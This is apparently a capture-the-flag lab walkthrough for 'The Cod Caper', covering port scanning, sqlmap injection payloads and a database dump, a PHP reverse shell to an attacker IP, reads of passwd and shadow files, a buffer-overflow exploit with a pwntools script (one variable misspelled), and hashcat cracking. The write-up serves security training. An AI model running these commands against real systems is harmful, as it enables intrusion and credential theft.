# The Cod Caper

infiltrating and exploiting a Linux system.

## Table of Contents

## Tools

- nmap
- gobuster
- sqlmap
- Linenum
- gnu debugger
- pwntools

## Host Enumeration

`:> nmap -p 1-1000 -sC -A <Target IP>`  

```md
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-14 02:23 GMT
Nmap scan report for 10.64.154.106
Host is up (0.00087s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/14%OT=22%CT=1%CU=32893%PV=Y%DS=1%DC=T%G=Y%TM=6966FE4
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M23
OS:01ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.88 ms 10.64.154.106

```


## Web Enumeration

`:> gobuster dir -u <Target URL> --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x php,txt,html`

```md
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.154.106
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/administrator.php    (Status: 200) [Size: 409] <- NOTE! 
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
Progress: 81892 / 81896 (100.00%)
===============================================================
Finished
===============================================================
```

![Admin Portal](/assets/cod-caper-101.png)  

## Web Exploitation

Capture a request to administrator.php with Burp Suite.  

![Request](/assets/cod-caper-102.png)  

Use the "save item" option in the "Message Action" menu.  

[Message Action](/assets/cod-caper-103.png)

### Identify the DBMS

`:> sqlmap -r cod-request.txt --banner`  

```md
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:23:52 /2026-01-14/

[03:23:52] [INFO] parsing HTTP request from 'cod-request.txt'
[03:23:52] [INFO] resuming back-end DBMS 'mysql' 
[03:23:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=dummyuser' RLIKE (SELECT (CASE WHEN (2989=2989) THEN 0x64756d6d7975736572 ELSE 0x28 END))-- zxPw&password=dummypass

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=dummyuser' OR (SELECT 3143 FROM(SELECT COUNT(*),CONCAT(0x716a6b6a71,(SELECT (ELT(3143=3143,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bQIq&password=dummypass

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=dummyuser' AND (SELECT 9641 FROM (SELECT(SLEEP(5)))TIBZ)-- Yoeo&password=dummypass
---
[03:23:52] [INFO] the back-end DBMS is MySQL
[03:23:52] [INFO] fetching banner
[03:23:52] [INFO] retrieved: '5.7.28-0ubuntu0.16.04.2'
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0
banner: '5.7.28-0ubuntu0.16.04.2'
[03:23:52] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.64.154.106'
[03:23:52] [WARNING] you haven't updated sqlmap for more than 2112 days!!!

[*] ending @ 03:23:52 /2026-01-14/

```

### Test for union-based attacks

`:> sqlmap -r cod-request.txt --batch --technique=U`

Not Vulnerable

### Test for blind attacks

`:> sqlmap -r cod-request.txt --batch --technique=B`

```md
[03:40:00] [INFO] parsing HTTP request from 'cod-request.txt'
[03:40:00] [INFO] resuming back-end DBMS 'mysql' 
[03:40:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=dummyuser' RLIKE (SELECT (CASE WHEN (2989=2989) THEN 0x64756d6d7975736572 ELSE 0x28 END))-- zxPw&password=dummypass
---
[03:40:00] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[03:40:00] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.64.154.106'
[03:40:00] [WARNING] you haven't updated sqlmap for more than 2112 days!!!

[*] ending @ 03:40:00 /2026-01-14/
```

Is Vulnerable

### Test for error-based attacks

`:> sqlmap -r cod-request.txt --batch --technique=E`

```md
[03:38:56] [INFO] parsing HTTP request from 'cod-request.txt'
[03:38:56] [INFO] resuming back-end DBMS 'mysql' 
[03:38:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=dummyuser' OR (SELECT 3143 FROM(SELECT COUNT(*),CONCAT(0x716a6b6a71,(SELECT (ELT(3143=3143,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bQIq&password=dummypass
---
[03:38:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[03:38:56] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.64.154.106'
[03:38:56] [WARNING] you haven't updated sqlmap for more than 2112 days!!!

[*] ending @ 03:38:56 /2026-01-14/
```
Is Vulnerable

### Test for time-based attacks

`:> sqlmap -r cod-request.txt --batch --technique=T`

```md
[03:34:01] [INFO] parsing HTTP request from 'cod-request.txt'
[03:34:02] [INFO] resuming back-end DBMS 'mysql' 
[03:34:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=dummyuser' AND (SELECT 9641 FROM (SELECT(SLEEP(5)))TIBZ)-- Yoeo&password=dummypass
---
[03:34:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[03:34:02] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.64.154.106'
[03:34:02] [WARNING] you haven't updated sqlmap for more than 2112 days!!!
```

Is Vulnerable

### List the databases

`:> sqlmap -r cod-request.txt --batch --dbs `

where

--batch auto-confirms all prompts

--dbs enumerates available databases

[List databases](/assets/cod-caper-104.png)  


### View Tables in the database

`:> sqlmap -r cod-request.txt --batch -D users --tables`

[DB Tables](/assets/cod-caper-105.png)  

### Show Columns in the Table

`:> sqlmap -r cod-request.txt --batch -D users -T users --columns`

### Show all data from the table

`:> sqlmap -r cod-request.txt --batch -D users -T users --dump`

[Data](/assets/cod-caper-107.png)

### Download the database

`:> sqlmap -r cod-request.txt --batch -D users --dump-all --output-dir=<path to directory>`

## Command Execution

Log into the Administrator page

`:> ls`  
`:> cat /etc/passwd`  

### Reverse Shell  

Start the listener on the attacking host: `:> nc -lvnp 4444`

Select a PHP shell command from [Pentest Moneky](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  

`php -r '$sock=fsockopen("10.64.68.33",4444);exec("/bin/bash -i <&3 >&3 2>&3");'`  

![Reverse Shell](/assets/cod-caper-108.png)  

Among the searches... 

`:> find / -name *hidden* 2>/dev/null`

There is a specific directory  

![hidden](/assets/cod-caper-109.png)  

Which happens to be owned by the current user  

![owner](/assets/cod-caper-110.png)  

The contents allow for the use of SSH.  

![ssh](/assets/cod-caper-111.png)  


## LinEnum

Clone the repo

`:> git clone https://github.com/rebootuser/LinEnum.git`

use secure copy to put LinEnum.sh on the target device, in the temp folder.

`:> scp LinEnum.sh pingu@<target IP>:/tmp`

Make the script executable

`:> chmod +x LinEnum.sh`

Run LinEnum.sh

`:> ./LinEnum.sh -s -r report -e /tmp`

Read the output to find interesting file and directories: `:> less report`  


## pwndbg

From the [Git](https://github.com/pwndbg/pwndbg): "Pwndbg is a Python module which can be loaded into GDB or run as a REPL interface for LLDB. It provides a suite of utilities and enhancements that fill the gaps left by these debuggers, smoothing out rough edges and making them more user-friendly."

### Read the code of the suid binary:

```c
#include "unistd.h"
#include "stdio.h"
#include "stdlib.h"
void shell(){
setuid(1000);
setgid(1000);
system("cat /var/backups/shadow.bak");
}

void get_input(){
char buffer[32];
scanf("%s",buffer);
}

int main(){
get_input();
}
```

Note the buffer is set to 32 bytes and there is not input validation check.

### Open the suid file

`:> gdb /opt/secret/root`  

It apears 'kaaa' in the point in the cyclic input which overwrites EIP.  

![gdb output](/assets/cod-caper-112.png)  

Identify where 'kaaa' happens in the cycle.   

`:> cyclic -l 0x6161616c`  

This indicates the 44 characters will cause the buffer overflow.  

## Binary-Exploitation: Manual  

### Disassemble the shell function

`:> disassemble shell`  

```md
Dump of assembler code for function shell:
   0x080484cb <+0>:	push   ebp
   0x080484cc <+1>:	mov    ebp,esp
   0x080484ce <+3>:	sub    esp,0x8
   0x080484d1 <+6>:	sub    esp,0xc
   0x080484d4 <+9>:	push   0x3e8
   0x080484d9 <+14>:	call   0x80483a0 <setuid@plt>
   0x080484de <+19>:	add    esp,0x10
   0x080484e1 <+22>:	sub    esp,0xc
   0x080484e4 <+25>:	push   0x3e8
   0x080484e9 <+30>:	call   0x8048370 <setgid@plt>
   0x080484ee <+35>:	add    esp,0x10
   0x080484f1 <+38>:	sub    esp,0xc
   0x080484f4 <+41>:	push   0x80485d0
   0x080484f9 <+46>:	call   0x8048380 <system@plt>
   0x080484fe <+51>:	add    esp,0x10
   0x08048501 <+54>:	nop
   0x08048502 <+55>:	leave  
   0x08048503 <+56>:	ret    
End of assembler dump.
```  

### Craft the exploit

`:> python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root`

Note the vulnerable address is `0x080484cb` which must be converted to little endian when writing the exploit.

Exit gdb back to the bash command prompt and execute script  

![exploited](/assets/cod-caper-113.png)

## Binary Expoloitation: The pwntools way

From the [Git Repository](https://github.com/Gallopsled/pwntools): "Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible."

```python

# Import the pwntools library
from pwn import *

# Create the process that will permit pwntools to interact with the target binary
proc = process('/opt/secret/root')  

# use the ELF function to obtain memory addresses
elf = ELF('/opt/secret/root')

# Create a variable to hold memory addresses of the shell function
shell_func = elf.symbols.shell

# Generate the exploit payload with the fit() function
payload = fit({44: shell_funct})

proc.sendline(payload)
proc.interactive() 

```

```md
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::

```

## Finishing the Job

hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
